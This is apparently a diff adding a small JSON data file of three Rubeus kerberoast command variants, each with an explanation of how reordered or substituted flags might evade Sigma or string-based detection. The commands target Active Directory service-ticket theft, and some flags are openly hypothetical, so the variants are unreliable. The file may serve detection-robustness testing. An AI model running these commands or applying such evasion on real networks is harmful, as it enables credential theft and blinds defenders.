@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Lab\\input\\rubeus.exe kerberoast /outfile:C:\\Lab\\out\\rubeus_output.txt",
+    "explanation": "Reordering: The command line reorders the parameters to avoid the 'kerberoast' keyword being directly adjacent to the file path, potentially evading string-based detection."
+  },
+  {
+    "output": "C:\\Lab\\input\\rubeus.exe /command kerberoast /outfile:C:\\Lab\\out\\rubeus_output.txt",
+    "explanation": "Substitution: Replacing the direct command with a hypothetical /command flag to mask the 'kerberoast' keyword, which may not be recognized by the Sigma rule."
+  },
+  {
+    "output": "C:\\Lab\\input\\rubeus.exe -c kerberoast -o C:\\Lab\\out\\rubeus_output.txt",
+    "explanation": "Substitution: Using alternative flag syntax (-c and -o) instead of the default parameters, which could bypass detection based on specific command-line argument patterns."
+  }
+]
